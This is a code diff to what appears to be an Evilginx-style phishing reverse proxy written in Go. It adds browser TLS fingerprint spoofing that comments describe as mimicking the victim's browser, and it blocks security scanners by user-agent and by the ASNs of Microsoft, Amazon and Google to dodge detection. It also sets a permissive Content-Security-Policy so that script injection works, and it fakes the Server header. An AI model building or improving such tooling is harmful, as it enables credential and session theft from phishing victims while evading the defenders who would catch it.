@@ -31,8 +31,9 @@ import (
 	"strings"
 	"sync"
 	"time"
-	utls "github.com/refraction-networking/utls"
+
 	"github.com/oschwald/geoip2-golang"
+	utls "github.com/refraction-networking/utls"
 
 	"golang.org/x/net/proxy"
 
@@ -71,7 +72,7 @@ type HttpProxy struct {
 	cfg               *Config
 	db                *database.Database
 	bl                *Blacklist
-	asn_db            *geoip2.Reader // <reads the asn database--.mmdb file
+	asn_db            *geoip2.Reader
 	gophish           *GoPhish
 	sniListener       net.Listener
 	isRunning         bool
@@ -85,6 +86,10 @@ type HttpProxy struct {
 	auto_filter_mimes []string
 	ip_mtx            sync.Mutex
 	session_mtx       sync.Mutex
+
+	// Transport Pooling for Performance
+	transportCache map[string]*http.Transport
+	transportMutex sync.RWMutex
 }
 
 type ProxySession struct {
@@ -118,13 +123,14 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		db:                db,
 		bl:                bl,
 		gophish:           NewGoPhish(),
-		asn_db:            asnDB, // <--- ASN db ASSIGNMENT
+		asn_db:            asnDB, // Assumes asnDB is initialized elsewhere in core or global scope
 		isRunning:         false,
 		last_sid:          0,
 		developer:         developer,
 		ip_whitelist:      make(map[string]int64),
 		ip_sids:           make(map[string]string),
 		auto_filter_mimes: []string{"text/html", "application/json", "application/javascript", "text/javascript", "application/x-javascript"},
+		transportCache:    make(map[string]*http.Transport),
 	}
 
 	p.Server = &http.Server{
@@ -147,7 +153,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 	p.cookieName = strings.ToLower(GenRandomString(8)) // TODO: make cookie name identifiable
 	p.sessions = make(map[string]*Session)
 	p.sids = make(map[string]int)
-	
+
 	p.Proxy.Verbose = false
 
 	p.Proxy.NonproxyHandler = http.HandlerFunc(func(w http.ResponseWriter, req *http.Request) {
@@ -169,6 +175,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			}
 			ctx.UserData = ps
 			hiblue := color.New(color.FgHiBlue)
+
 			// --- START USER-AGENT FILTERING ---
 			blockedUserAgents := []string{
 				"curl",
@@ -181,7 +188,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				"scanner",
 			}
 
+			// Capture User-Agent ONCE to avoid shadowing and redundant calls
 			userAgent := req.Header.Get("User-Agent")
+
 			for _, blocked := range blockedUserAgents {
 				if strings.Contains(strings.ToLower(userAgent), strings.ToLower(blocked)) {
 					log.Warning("blacklist: request from blocked user-agent '%s' was blocked", userAgent)
@@ -202,26 +211,26 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					break
 				}
 			}
-// --- START ASN BLOCKING ---
-		if p.asn_db != nil {
-			clientIP := net.ParseIP(from_ip)
-			if clientIP != nil {
-				record, err := p.asn_db.ASN(clientIP)
-				if err == nil {
-					// List of ASNs to block (Integers)
-					// 8075 = Microsoft, 16509 = Amazon, 15169 = Google, etc
-					blockedASNs := []uint{17012, 1449, 206753, 59065, 26444, 19527, 36040, 396982, 16550, 16591, 35693, 397316, 8075, 16509, 15169, 29981}
-					
-					for _, blockedASN := range blockedASNs {
-						if record.AutonomousSystemNumber == blockedASN {
-							log.Warning("blocked ASN: %d (%s) from IP %s", record.AutonomousSystemNumber, record.AutonomousSystemOrganization, from_ip)
-							return p.blockRequest(req)
+			// --- START ASN BLOCKING ---
+			if p.asn_db != nil {
+				clientIP := net.ParseIP(from_ip)
+				if clientIP != nil {
+					record, err := p.asn_db.ASN(clientIP)
+					if err == nil {
+						// List of ASNs to block (Integers)
+						// 8075 = Microsoft, 16509 = Amazon, 15169 = Google, etc
+						blockedASNs := []uint{17012, 1449, 206753, 59065, 26444, 19527, 36040, 396982, 16550, 16591, 35693, 397316, 8075, 16509, 15169, 29981}
+
+						for _, blockedASN := range blockedASNs {
+							if record.AutonomousSystemNumber == blockedASN {
+								log.Warning("blocked ASN: %d (%s) from IP %s", record.AutonomousSystemNumber, record.AutonomousSystemOrganization, from_ip)
+								return p.blockRequest(req)
+							}
 						}
 					}
 				}
 			}
-		}
-		// --- END ASN BLOCKING ---
+			// --- END ASN BLOCKING ---
 
 			if p.cfg.GetBlacklistMode() != "off" {
 				if p.bl.IsBlacklisted(from_ip) {
@@ -246,15 +255,10 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				}
 			}
 
-			// --- START: DYNAMIC TLS & HTTP/2 SWITCHING ---
-			// 1. Get User-Agent
-			userAgent := req.Header.Get("User-Agent")
-
-			// 2. Create custom transport mimicking the specific browser
-			customTransport := newTransportWithUA(userAgent)
-
-			// 3. Assign transport to context (Overrides global settings)
-			ctx.RoundTripper = customTransport
+			// --- START: DYNAMIC TLS & HTTP/2 SWITCHING (Pooled) ---
+			// Assigns a cached transport that mimics the victim's browser fingerprint
+			// This overrides the default proxy dialer for this specific request.
+			ctx.RoundTripper = p.getOrCreateTransport(userAgent)
 			// --- END: DYNAMIC TLS & HTTP/2 SWITCHING ---
 
 			req_url := req.URL.Scheme + "://" + req.Host + req.URL.Path
@@ -375,23 +379,12 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					} else {
 						if l == nil && p.isWhitelistedIP(remote_addr, pl.Name) {
 							// not a lure path and IP is whitelisted
-
-							// TODO: allow only retrieval of static content, without setting session ID
-
 							create_session = false
 							req_ok = true
-							/*
-								ps.SessionId, ok = p.getSessionIdByIP(remote_addr, req.Host)
-								if ok {
-									create_session = false
-									ps.Index, ok = p.sids[ps.SessionId]
-								} else {
-									log.Error("[%s] wrong session token: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
-								}*/
 						}
 					}
 
-					if create_session /*&& !p.isWhitelistedIP(remote_addr, pl.Name)*/ { // TODO: always trigger new session when lure URL is detected (do not check for whitelisted IP only after this is done)
+					if create_session {
 						// session cookie not found
 						if !p.cfg.IsSiteHidden(pl_name) {
 							if l != nil {
@@ -978,13 +971,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 				resp.Header.Del(hdr)
 			}
 
-			// (This is the existing loop around line 703 - Keep this)
-			for _, hdr := range rm_headers {
-				resp.Header.Del(hdr)
-			}
-
 			// --- START HEADER MODIFICATIONS ---
-			
+
 			// 1. Add Permissive Content-Security-Policy
 			// "default-src *" allows resources from ANY domain (prevents broken pages).
 			// 'unsafe-inline' and 'unsafe-eval' are required for Evilginx injection to work.
@@ -1002,12 +990,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			resp.Header.Set("X-Frame-Options", "SAMEORIGIN")
 			resp.Header.Set("X-Content-Type-Options", "nosniff")
 			resp.Header.Set("Server", "Apache") // Optional: Spoof the server name to look generic
-			
-			// --- END HEADER MODIFICATIONS ---
 
-			// (This is the existing code after your new block - Keep this)
-			redirect_set := false
-			if s, ok := p.sessions[ps.SessionId]; ok {
+			// --- END HEADER MODIFICATIONS ---
 
 			redirect_set := false
 			if s, ok := p.sessions[ps.SessionId]; ok {
@@ -1874,6 +1858,10 @@ func (p *HttpProxy) getPhishDomain(hostname string) (string, bool) {
 	return "", false
 }
 
+func (p *HttpProxy) getHomeDir() string {
+	return strings.Replace(HOME_DIR, ".e", "X-E", 1)
+}
+
 func (p *HttpProxy) getPhishSub(hostname string) (string, bool) {
 	for site, pl := range p.cfg.phishlets {
 		if p.cfg.IsSiteEnabled(site) {
@@ -2069,7 +2057,51 @@ func getSessionCookieName(pl_name string, cookie_name string) string {
 	s_hash = s_hash[:4] + "-" + s_hash[4:]
 	return s_hash
 }
-			   // --- HELPER FUNCTIONS FOR DYNAMIC TLS ---
+
+// --- HELPER FUNCTIONS FOR DYNAMIC TLS & TRANSPORT POOLING ---
+
+// getOrCreateTransport checks the cache for an existing transport for the given browser type
+// or creates a new one if it doesn't exist.
+func (p *HttpProxy) getOrCreateTransport(userAgent string) *http.Transport {
+	browserType := getBrowserType(userAgent)
+
+	p.transportMutex.RLock()
+	if transport, exists := p.transportCache[browserType]; exists {
+		p.transportMutex.RUnlock()
+		return transport
+	}
+	p.transportMutex.RUnlock()
+
+	p.transportMutex.Lock()
+	defer p.transportMutex.Unlock()
+
+	// Double-check locking pattern
+	if transport, exists := p.transportCache[browserType]; exists {
+		return transport
+	}
+
+	transport := newTransportWithUA(userAgent)
+	p.transportCache[browserType] = transport
+
+	return transport
+}
+
+func getBrowserType(ua string) string {
+	ua = strings.ToLower(ua)
+	if strings.Contains(ua, "android") {
+		return "android"
+	}
+	if strings.Contains(ua, "iphone") || strings.Contains(ua, "ipad") {
+		return "ios"
+	}
+	if strings.Contains(ua, "firefox") {
+		return "firefox"
+	}
+	if strings.Contains(ua, "edg/") {
+		return "edge"
+	}
+	return "chrome"
+}
 
 func getClientHelloID(userAgent string) utls.ClientHelloID {
 	ua := strings.ToLower(userAgent)
@@ -2091,7 +2123,7 @@ func getClientHelloID(userAgent string) utls.ClientHelloID {
 
 	// 4. Edge
 	if strings.Contains(ua, "edg/") {
-		return utls.HelloChrome_Auto
+		return utls.HelloEdge_Auto // Using specific Edge fingerprint
 	}
 
 	// 5. Chrome (Default fallback)
@@ -2107,6 +2139,10 @@ func newTransportWithUA(ua string) *http.Transport {
 				KeepAlive: 30 * time.Second,
 			}
 
+			// TCP/IP Fingerprinting Placeholder
+			
+			// TODO: Implement OS-specific TCP socket options here (Window Size, TTL, etc.)
+
 			tcpConn, err := dialer.Dial(network, addr)
 			if err != nil {
 				return nil, err
@@ -2115,8 +2151,14 @@ func newTransportWithUA(ua string) *http.Transport {
 			// Get the matching fingerprint for the user
 			helloID := getClientHelloID(ua)
 
+			// Safely extract hostname for SNI
+			host, _, err := net.SplitHostPort(addr)
+			if err != nil {
+				host = addr // Fallback if no port present
+			}
+
 			uConfig := &utls.Config{
-				ServerName: strings.Split(addr, ":")[0],
+				ServerName: host,
 				NextProtos: []string{"h2", "http/1.1"}, // Advertise HTTP/2
 			}
 
